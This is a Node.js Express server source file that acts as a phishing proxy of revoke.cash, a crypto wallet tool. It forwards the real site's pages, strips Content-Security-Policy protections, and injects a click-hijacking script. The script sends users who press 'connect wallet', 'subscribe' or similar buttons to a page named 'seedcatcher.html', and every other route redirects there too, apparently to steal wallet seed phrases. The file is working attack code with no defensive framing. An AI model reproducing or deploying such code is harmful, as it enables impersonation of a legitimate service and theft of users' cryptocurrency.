const express = require('express');
const axios = require('axios');
const fs = require('fs');
const path = require('path');
const app = express();
const port = process.env.PORT || 8080;

const hijackScript = `
<script>
document.addEventListener('click', function(e) {
    let target = e.target.closest('a, button, div, span');
    if (!target) return;
    let text = (target.innerText || "").toLowerCase().trim();
    let href = (target.getAttribute("href") || "").toLowerCase();
    if (href === '/premium' || href === 'https://revoke.cash/premium') return;
    if (text.includes('get started') || text.includes('subscribe') || text.includes('upgrade') || text.includes('connect wallet')) {
        e.preventDefault();
        e.stopPropagation();
        window.location.href = '/seedcatcher.html';
    }
}, true);
</script>
`;

app.use(async (req, res, next) => {
    const localFile = path.join(__dirname, req.path);
    if (fs.existsSync(localFile) && fs.lstatSync(localFile).isFile()) {
        return res.sendFile(localFile);
    }

    try {
        const url = 'https://revoke.cash' + req.originalUrl;
        const response = await axios({
            method: req.method,
            url: url,
            responseType: 'stream',
            headers: { 
                ...req.headers, 
                host: 'revoke.cash',
                'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1'
            }
        });
        
        res.setHeader('Access-Control-Allow-Origin', '*');
        res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
        res.setHeader('Access-Control-Allow-Headers', '*');
        res.removeHeader('Content-Security-Policy');
        res.removeHeader('Content-Security-Policy-Report-Only');

        if (req.path === '/' || req.path === '/index.html') {
            let html = '';
            response.data.on('data', chunk => html += chunk);
            response.data.on('end', () => {
                html = html.replace(/<meta http-equiv="Content-Security-Policy".*?>/gi, '');
                
                // INJECT INLINE SCRIPT
                if (html.includes('</body>')) {
                    html = html.replace('</body>', hijackScript + '</body>');
                }
                res.send(html);
            });
        } else {
            if (response.headers['content-type']) {
                res.setHeader('Content-Type', response.headers['content-type']);
            }
            response.data.pipe(res);
        }
    } catch (error) {
        next(); 
    }
});

app.get('*', (req, res) => {
    res.redirect('/seedcatcher.html');
});

app.listen(port, () => {
    console.log(`Server running on port ${port}`);
});
